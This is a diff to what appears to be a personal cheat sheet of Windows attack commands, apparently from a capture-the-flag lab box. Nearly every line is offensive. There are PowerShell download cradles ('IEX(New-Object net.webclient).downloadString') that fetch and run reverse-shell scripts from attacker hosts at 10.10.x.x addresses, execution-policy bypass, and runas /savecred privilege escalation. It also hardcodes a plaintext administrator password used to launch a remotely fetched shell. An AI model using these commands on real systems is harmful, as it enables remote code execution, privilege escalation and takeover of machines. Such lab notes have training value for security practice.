@@ -9,3 +9,21 @@ echo $url = "http://10.10.12.125:8000/shell.ps1" >>wget.ps1
 echo $file = "powerup.ps1" >>wget.ps1
 echo $webclient.DownloadFile($url,$file) >>wget.ps1
 powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
+
+dir c:\windows\syswow64\windowspowershell\v1.0\powershell.exe
+c:\windows\syswow64\windowspowershell\v1.0\powershell.exe  "IEX(New-Object net.webclient).downloadString('http://10.10.15.174/rv.ps1')"
+
+runas /netonly /user:administrator ' c:\windows\syswow64\windowspowershell\v1.0\powershell.exe'  "IEX(New-Object net.webclient).downloadString('http://10.10.15.174/shell.ps1')"'
+
+cmd /c runas /user:administrator  "cmd /c cd  c:\users\administrator" '
+
+
+runas /user:yourusernamehere /savecred "echo adf"
+Start-Process powershell.exe -Credential "Access\administrator"
+
+$username = 'administrator'
+$password = 'access4u@security'
+
+$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
+$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
+Start-Process IEX(New-Object net.webclient).downloadString('http://10.10.15.174/shell.ps1') -Credential $credential
